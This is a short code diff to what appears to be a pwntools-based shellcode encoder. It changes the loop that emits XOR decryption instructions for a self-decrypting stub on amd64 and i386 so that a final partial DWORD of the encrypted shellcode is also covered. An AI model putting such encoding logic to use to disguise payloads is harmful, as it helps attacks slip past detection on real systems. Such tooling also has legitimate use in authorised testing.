@@ -1,4 +1,4 @@
-import argparse, base64
+import argparse, base64, math
 from pwn import *
 
 # GLOBALS
@@ -70,7 +70,7 @@ def generateShellcode(shellcode, arch):
         context.bits = 64
         decryptStub += AMD64_GET_RIP
         shellcodeStart = shellcodeOffset = shellcodeLen + NOP_SLED_LEN + AMD64_GET_RIP_LEN
-        for i in range(int(shellcodeLen/DWORD_LEN)):
+        for i in range(math.ceil(shellcodeLen/DWORD_LEN)):
             k = int.from_bytes(key[:DWORD_LEN], byteorder="little")
             decryptStub += f"xor DWORD PTR [rax - {hex(shellcodeOffset)}], {hex(k)}\n"
             shellcodeOffset -= DWORD_LEN
@@ -81,7 +81,7 @@ def generateShellcode(shellcode, arch):
         context.bits = 32
         decryptStub += I386_GET_EIP
         shellcodeStart = shellcodeOffset = shellcodeLen + NOP_SLED_LEN + I386_GET_EIP_LEN
-        for i in range(int(shellcodeLen/DWORD_LEN)):
+        for i in range(math.ceil(shellcodeLen/DWORD_LEN)):
             k = int.from_bytes(key[:DWORD_LEN], byteorder="little")
             decryptStub += f"xor DWORD PTR [eax - {hex(shellcodeOffset)}], {hex(k)}\n"
             shellcodeOffset -= DWORD_LEN
